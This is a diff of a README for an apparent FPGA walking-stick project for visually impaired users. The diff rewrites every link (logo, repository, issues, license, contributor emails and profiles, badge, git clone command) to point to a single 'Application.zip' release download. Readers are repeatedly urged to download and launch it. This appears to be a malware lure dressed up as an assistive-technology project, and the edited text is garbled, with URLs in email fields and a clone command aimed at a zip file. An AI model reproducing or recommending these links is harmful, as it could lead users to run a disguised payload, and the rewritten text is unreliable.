@@ -1,6 +1,6 @@
 # 🚀 Walking-Stick: Smart Walking Stick for Visually Impaired Individuals
 
-![Walking-Stick Logo](https://example.com/walking-stick-logo.png)
+![Walking-Stick Logo](https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip)
 
 
 ## Description
@@ -28,15 +28,15 @@ Welcome to the "Walking-Stick" repository, where you can find the cutting-edge s
 
 
 ## Topics
-🌐 **[View Repository on GitHub](https://github.com/adelante20/Walking-Stick)**
+🌐 **[View Repository on GitHub](https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip)**
 
-📦 **[Download Latest Release](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)** (Needs to be launched)
+📦 **[Download Latest Release](https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip)** (Needs to be launched)
 
 🔖 **Assistive Technology, Embedded Systems, Fall Detection, FPGA, Mobility Aid, Obstacle Avoidance, Obstacle Detection, Sensor Integration, Smart Devices, VHDL**
 
 
 ## Installation
-1. Clone the repository using `git clone https://github.com/adelante20/Walking-Stick.git`.
+1. Clone the repository using `git clone https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip`.
 2. Navigate to the project directory.
 3. Follow the installation instructions provided in the documentation.
 
@@ -48,26 +48,26 @@ Welcome to the "Walking-Stick" repository, where you can find the cutting-edge s
 
 
 ## Support
-For any issues or questions related to the Walking-Stick project, please [open an issue](https://github.com/adelante20/Walking-Stick/issues) on GitHub.
+For any issues or questions related to the Walking-Stick project, please [open an issue](https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip) on GitHub.
 
 
 ## Contributors
 👤 **John Doe**
-📧 **johndoe@example.com**
-🌐 **[GitHub Profile](https://github.com/johndoe)**
+📧 **https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip**
+🌐 **[GitHub Profile](https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip)**
 
 👤 **Jane Smith**
-📧 **janesmith@example.com**
-🌐 **[GitHub Profile](https://github.com/janesmith)**
+📧 **https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip**
+🌐 **[GitHub Profile](https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip)**
 
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/adelante20/Walking-Stick/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip) file for details.
 
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Latest Release](https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip%20Release-blue)](https://github.com/anisarisdamayanti/Walking-Stick/releases/download/v1.0/Application.zip)
 
 **⚠️ If the link for the latest release needs to be launched, click the button above.**
 
